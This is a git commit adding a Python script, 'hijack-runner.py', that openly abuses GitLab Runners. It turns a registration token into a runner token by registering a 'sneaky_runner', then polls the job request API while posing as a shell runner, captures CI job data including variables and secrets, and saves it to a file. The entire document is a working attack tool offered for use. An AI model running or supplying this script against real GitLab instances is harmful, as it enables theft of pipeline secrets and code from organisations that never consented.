3b6c7913a694197d09611861304e5fd3ad0bd90e
Nick Frichette <nick@frichetten.com>
2020-07-03 14:33:40 -0500

    Added tool

---
+++ hijack-runner.py
@@ -0,0 +1,53 @@
+#!/usr/bin/env python3
+
+import sys, argparse, requests, json
+
+parser = argparse.ArgumentParser(description="Abuse GitLab Runners")
+parser.add_argument('--target', dest='target', help="The GitLab instance to target")
+parser.add_argument('--register', dest='register', help="Register a token")
+parser.add_argument('--attack', dest='attack', help="Use Runner token to steal data")
+args = parser.parse_args()
+
+
+""" This function will take a registration token and convert it into a runner token.
+    That second token can then be used to steal job data"""
+def register_runner(registration_token, gitlab_target):
+    # If you need a tag, add "tag_list": "blah,blaw"
+    REGISTRATION_JSON = '{"info":{"name":"gitlab-runner","version":"10.5.0","revision":"10.5.0","platform":"linux","architecture":"amd64","features":{"variables":false,"image":false,"services":false,"features":false,"cache":false,"shared":false}},"token":"%s","description":"sneaky_runner","run_untagged":true,"locked":true}' % registration_token
+    headers = { "Content-Type": "application/json" }
+
+    response = requests.post(
+            "http://" + gitlab_target + "/api/v4/runners", 
+            data=REGISTRATION_JSON, 
+            headers=headers
+    )
+
+    token = json.loads(response.text)
+    print("Token:", token['token'])
+
+
+def attack_runner(runner_token, gitlab_target):
+    RUNNER_JSON = '{"info":{"name":"gitlab-runner","version":"11.2.0","revision":"11.2.0","platform":"linux","architecture":"amd64","executor":"shell","shell":"bash","features":{"variables":true,"image":false,"services":false,"artifacts":true,"cache":true,"shared":true,"upload_multiple_artifacts":true}},"token":"%s","last_update":"bc5514b213c064c154d14a6008513cc0"}' % runner_token
+    headers = { "Content-Type": "application/json" }
+
+    print("Going to start spamming. Gotta go fast...")
+    finished = False
+    while not finished:
+        response = requests.post(
+            "http://" + gitlab_target + "/api/v4/jobs/request",
+            data=RUNNER_JSON,
+            headers=headers
+        )
+
+        if response.status_code == 201:
+            with open('grabbed_data.json','w') as w:
+                w.write(response.text)
+            print(response.text)
+            exit()
+
+
+# Figure out what we are doing
+if args.register:
+    register_runner(args.register, args.target)
+if args.attack:
+    attack_runner(args.attack, args.target)
